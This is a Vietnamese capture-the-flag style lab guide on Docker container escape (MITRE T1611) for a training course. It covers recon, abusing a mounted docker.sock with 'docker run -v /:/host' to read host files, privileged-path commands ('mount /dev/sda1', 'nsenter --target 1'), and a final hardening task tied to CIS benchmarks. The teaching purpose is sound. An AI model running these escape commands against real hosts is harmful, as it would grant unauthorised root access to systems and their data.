# HƯỚNG DẪN THỰC HÀNH — Lab 9: Thoát container chiếm quyền host (Docker Escape)

- **Mã lab:** `dso-docker-escape`
- **Mức độ:** 4/4 (Chuyên sâu)
- **Công cụ:** `docker` CLI (qua socket), `cat`/`grep`/`ls`, `capsh`, `tar`
- **Kiến thức cần:** Linux shell; namespaces / capabilities / cgroups ở mức khái niệm; Docker socket là gì; MITRE ATT&CK **T1611 (Escape to Host)**; CIS Docker Benchmark

> Guide này mức **4/4**: chỉ cho **mục tiêu + hướng tiếp cận + tài liệu tham khảo**, **hạn chế câu lệnh sẵn**. Bạn tự tra cú pháp `docker`/`mount` và tự dựng lệnh. Bí thì mở **Gợi ý mở rộng** ở cuối mỗi nhiệm vụ. Flag sinh riêng theo mã sinh viên.

## Bối cảnh
Từ Lab 4/8 bạn đã có shell **bên trong container `app`**. Container này bị DevOps cấu hình cẩu thả. Mục tiêu: **thoát ra chiếm quyền host** (mô phỏng bằng container `host-sim`) và đọc `/root/flag.txt` — file **không** nằm trong không gian của `app`, chỉ đọc được sau khi escape thành công. Sau đó đổi vai DevSecOps, viết cấu hình `docker run` an toàn.

```
          mạng ảo Labtainer (172.35.0.0/24)

 +-----------------------------+         +------------------------------+
 | app      172.35.0.10        | escape  | host-sim   172.35.0.5        |
 | (bạn có shell ở đây)        | =====>  | MÔ PHỎNG HOST (Docker-in-Dkr) |
 | cấu hình SAI:               | T1611   | - Docker daemon + socket      |
 |  • mount /var/run/docker.sock|         | - /root/flag.txt (mục tiêu)   |
 | docker CLI, capsh, tar      |         | - /root/.hostmarker (canary)  |
 +-----------------------------+         +------------------------------+

 Luồng: trinh sát app -> lợi dụng docker.sock ra lệnh cho daemon host-sim
        -> tạo container mount rootfs host (-v /:/host) -> đọc flag trên host
```

> **Lưu ý topology:** `app` và `host-sim` là **hai container độc lập** (không chia sẻ PID namespace / block device thật của nhau). Vì vậy đường escape **bắt buộc** là **Docker socket** (Nhiệm vụ 2). Đường `--privileged`/`nsenter`/mount block device (Nhiệm vụ 3) ở đây chỉ mang tính **minh họa khái niệm**, không dẫn tới `/root` của host-sim — đừng mất thời gian ép nó ra flag.

## Khởi động
```bash
imodule https://github.com/namlt04/do-an-2026/raw/refs/heads/master/imodule/dso-docker-escape.tar
labtainer dso-docker-escape
```
Nhập email/mã sinh viên khi được hỏi (flag sinh riêng theo mã của bạn). Terminal mở ra là shell **trong container `app`**.

---

## Câu lệnh tham khảo (cú pháp chung — tự ghép, tự điền `<...>`)

| Mục đích | Cú pháp chung |
|---|---|
| Trinh sát môi trường container | `cat /proc/1/cgroup` · `grep -i cap /proc/self/status` · `capsh --print` |
| Tìm dấu hiệu cấu hình sai | `ls -la /var/run/docker.sock` · `ls -la /dev/sd*` · `fdisk -l` |
| Nói chuyện với daemon host | `docker -H unix:///var/run/docker.sock <SUBCMD>` (vd `version`, `ps`, `images`) |
| Tạo container mount rootfs host | `docker -H <SOCK> run -d --name <TÊN> -v /:/host <IMAGE> <CMD>` |
| Lấy file từ host ra | `docker -H <SOCK> cp <TÊN>:/host/<ĐƯỜNG_DẪN> <LOCAL>` |
| (minh họa) đường privileged | `mount /dev/sda1 /mnt/host` · `nsenter --target 1 --mount --pid -- sh` |

> Đây chỉ là "từ vựng" lệnh. Bạn tự nhận diện cấu hình sai, tự chọn đường escape (bài này đường bắt buộc là **Docker socket**) và tự dựng lệnh.

---

## Nhiệm vụ 1 — `recon_container`: Trinh sát & nhận diện cấu hình yếu
**Mục tiêu:** Xác nhận mình đang trong container và tìm (các) điểm cấu hình sai có thể dẫn tới escape.

**Hướng tiếp cận:**
- Xác nhận môi trường container: đọc `/proc/1/cgroup` (chuỗi `docker`/hash container).
- Đọc tập capability đang hiệu lực: `grep -i cap /proc/self/status` (chú ý dòng `CapEff`), hoặc `capsh --print`.
- Tìm 3 dấu hiệu escape kinh điển: **Docker socket** bị mount (`/var/run/docker.sock`), **block device host** (`/dev/sd*`), **`CAP_SYS_ADMIN`** thừa.
- **Chấm điểm:** gom toàn bộ phát hiện vào `~/recon.txt` (phải chứa ≥1 dấu hiệu: `docker.sock` / `sda` / `cap_sys_admin`).

**Hoàn thành khi:** `~/recon.txt` tồn tại và chứa bằng chứng ít nhất một cấu hình sai.

**Câu hỏi:** Nêu chính xác (các) điểm cấu hình sai bạn thấy và giải thích vì sao mỗi điểm phá vỡ ranh giới cô lập container–host. → ____

<details><summary>Gợi ý mở rộng</summary>

```bash
{ echo "=== cgroup ==="; cat /proc/1/cgroup;
  echo "=== CapEff ==="; grep -i cap /proc/self/status;
  echo "=== docker.sock ==="; ls -la /var/run/docker.sock 2>/dev/null;
  echo "=== block devices ==="; ls -la /dev/sd* 2>/dev/null; } > ~/recon.txt
cat ~/recon.txt
```
Dấu hiệu quyết định của bài: `/var/run/docker.sock` **tồn tại** trong `app`.
</details>

---

## Nhiệm vụ 2 — `escape_via_socket`: Thoát container qua Docker socket
**Mục tiêu:** Lợi dụng `/var/run/docker.sock` được mount vào `app` để ra lệnh cho Docker daemon của host tạo một container mới **mount toàn bộ rootfs host** (`-v /:/host`), qua đó truy cập filesystem của host-sim.

**Hướng tiếp cận:**
- Docker socket là "vô lăng" điều khiển daemon (chạy **root** trên host). Ai nói chuyện được với socket thì ra lệnh được cho daemon.
- Dùng `docker -H unix:///var/run/docker.sock` để: kiểm tra kết nối (`version`/`ps`), xem image có sẵn trên daemon (`images`).
- Tạo một container mới mount `/` của host vào `/host`, rồi lấy dữ liệu host ra. Bằng chứng escape là đọc được **canary** `/root/.hostmarker` của host (vùng `app` không thấy).
- **Chấm điểm:** lưu nội dung canary vào `~/host_evidence.txt`. Lệnh `docker ... run -v /:/host ...` **phải thực sự được gõ** (checkwork soi `~/.bash_history`), đừng chỉ chép từ file.

**Hoàn thành khi:** tạo được container mới qua socket và `~/host_evidence.txt` chứa nội dung `/root/.hostmarker` của host.

**Câu hỏi:** Vì sao mount `/var/run/docker.sock` vào container gần như tương đương cấp `root` trên host? (Gợi ý: daemon chạy dưới quyền gì?) → ____

<details><summary>Gợi ý mở rộng</summary>

- Image sẵn trên daemon host-sim tên `escimg`. Nếu socket chưa sẵn, có đường dự phòng TCP `tcp://172.35.0.5:2375`.
```bash
DH=unix:///var/run/docker.sock
docker -H $DH version && docker -H $DH images
docker -H $DH rm -f esc 2>/dev/null
docker -H $DH run -d --name esc -v /:/host escimg sleep 300
docker -H $DH cp esc:/host/root/.hostmarker ~/host_evidence.txt
cat ~/host_evidence.txt
```
- Cách khác: `... run -v /:/host escimg chroot /host sh` rồi thao tác trong shell "trên host".
</details>

---

## Nhiệm vụ 3 — `escape_via_privileged`: (minh họa) đường privileged / CAP_SYS_ADMIN
**Mục tiêu:** Hiểu đường escape thứ hai về mặt khái niệm: nếu container chạy `--privileged` hoặc có `CAP_SYS_ADMIN`, attacker có thể `mount` thẳng block device host hoặc dùng `nsenter --target 1` nhảy vào namespace tiến trình host.

**Hướng tiếp cận:**
- Đây là **nhiệm vụ nhận thức**, không bắt buộc lấy flag (xem lưu ý topology ở đầu bài: `app`/`host-sim` tách rời nên đường này không chạm `/root` host-sim). Mục tiêu này được ghi nhận cùng phần trinh sát.
- Nắm **điều kiện tiền đề** của từng đường: mount block device cần thấy `/dev/sda*` + `CAP_SYS_ADMIN`; `nsenter --target 1` cần chia sẻ PID namespace của host + đủ đặc quyền.

**Hoàn thành khi:** bạn mô tả được (trong câu trả lời) hai kỹ thuật và điều kiện tiền đề của chúng; mục tiêu tự ghi nhận cùng Nhiệm vụ 1.

**Câu hỏi:** So sánh mức nguy hiểm & điều kiện tiền đề của 3 đường escape (docker.sock, `--privileged`, `CAP_SYS_ADMIN` đơn lẻ). Đường nào "ồn ào"/dễ bị phát hiện nhất, vì sao? → ____

<details><summary>Gợi ý mở rộng</summary>

- Mount block device: `mkdir -p /mnt/host && mount /dev/sda1 /mnt/host && ls /mnt/host/root`.
- Nsenter: `nsenter --target 1 --mount --uts --ipc --net --pid -- sh`.
- Cả hai chỉ hoạt động khi container được cấp đủ đặc quyền và chia sẻ tài nguyên host — không phải topology của bài này.
</details>

---

## Nhiệm vụ 4 — `get_flag`: Đọc flag trên host
**Mục tiêu:** Dùng quyền truy cập host vừa giành được (qua socket, Nhiệm vụ 2) đọc `/root/flag.txt` trên host — bằng chứng escape thành công.

**Hướng tiếp cận:**
- Dùng đúng con đường đã escape để lấy file flag của host (tương tự cách lấy canary ở Nhiệm vụ 2).
- **Chấm điểm:** lưu chuỗi flag vào `~/flag_result.txt`.

**Hoàn thành khi:** `~/flag_result.txt` chứa flag đúng định dạng (ví dụ `PTIT{...}`), lấy từ `/root/flag.txt` của host.

**Câu hỏi:** Trình bày lại toàn chuỗi tấn công từ shell ban đầu tới khi đọc flag. Đâu là **nguyên nhân gốc rễ** khiến escape thành công? → ____

<details><summary>Gợi ý mở rộng</summary>

```bash
docker -H unix:///var/run/docker.sock cp esc:/host/root/flag.txt ~/flag_result.txt
cat ~/flag_result.txt
docker -H unix:///var/run/docker.sock rm -f esc
```
</details>

---

## Nhiệm vụ 5 — `harden_container`: Cấu hình container an toàn (DevSecOps)
**Mục tiêu:** Đổi vai DevSecOps, viết lệnh `docker run` an toàn loại bỏ đường escape, và lập bảng ánh xạ cấu hình sai → biện pháp → mục CIS Docker Benchmark.

**Hướng tiếp cận:**
- Viết `~/hardened_run.sh` theo least privilege: **KHÔNG** `--privileged`, **KHÔNG** mount `docker.sock`, `--cap-drop=ALL` (chỉ cap-add thứ thực cần), chạy user không-root (`--user`), bật `no-new-privileges` + seccomp, mount read-only khi có thể.
- Viết `~/hardening_map.txt` ánh xạ từng cấu hình sai đã khai thác tới cách khắc phục và mục CIS (5.31 socket, 5.4 privileged, 5.3 capabilities, 4.1/2.8 user, 5.1/5.21 seccomp).

**Hoàn thành khi:** tồn tại cả `~/hardened_run.sh` (có `--cap-drop=ALL`, **không** `--privileged`, **không** `docker.sock`) và `~/hardening_map.txt` (ánh xạ đủ các cấu hình sai đã khai thác).

**Câu hỏi:** Trong pipeline CI/CD, bạn tự động chặn cấu hình sai này ở khâu nào, bằng công cụ gì (kiểm tra tĩnh cấu hình, policy-as-code, quét image)? Vì sao "shift-left" hiệu quả hơn chỉ phòng thủ runtime? → ____

<details><summary>Gợi ý mở rộng</summary>

```bash
cat > ~/hardened_run.sh <<'EOF'
docker run -d --name app \
  --cap-drop=ALL \
  --security-opt=no-new-privileges \
  --security-opt seccomp=/etc/docker/seccomp-default.json \
  --user 10001:10001 --read-only --pids-limit 128 --memory=256m \
  app:student
# KHÔNG --privileged, KHÔNG -v /var/run/docker.sock:/var/run/docker.sock
EOF
cat > ~/hardening_map.txt <<'EOF'
docker.sock mount   -> Bo mount socket; dung proxy co kiem soat quyen  (CIS 5.31)
--privileged        -> Bo privileged; chi cap quyen toi thieu          (CIS 5.4)
CAP_SYS_ADMIN thua  -> --cap-drop=ALL roi cap-add dung nhu cau          (CIS 5.3)
Chay bang root      -> --user / userns-remap                            (CIS 4.1/2.8)
Khong co seccomp    -> Bat seccomp/AppArmor + no-new-privileges         (CIS 5.1/5.21)
EOF
```
</details>

---

## Chấm điểm
```bash
checkwork dso-docker-escape
```
Đạt khi cả 5 mục tiêu = **Y**: `recon_container`, `escape_via_socket`, `escape_via_privileged`, `get_flag`, `harden_container`.

> Đây là bài đỉnh của nhóm nâng cao: nếu chưa Y, đừng tìm "lệnh sẵn" — quay lại **Hướng tiếp cận**, nhớ đường escape bắt buộc là **Docker socket**, và kiểm tra các artifact: `~/recon.txt`, `~/host_evidence.txt`, `~/flag_result.txt`, `~/hardened_run.sh`, `~/hardening_map.txt`. Lệnh `docker run -v /:/host ...` phải được **gõ thật** (ghi vào history).
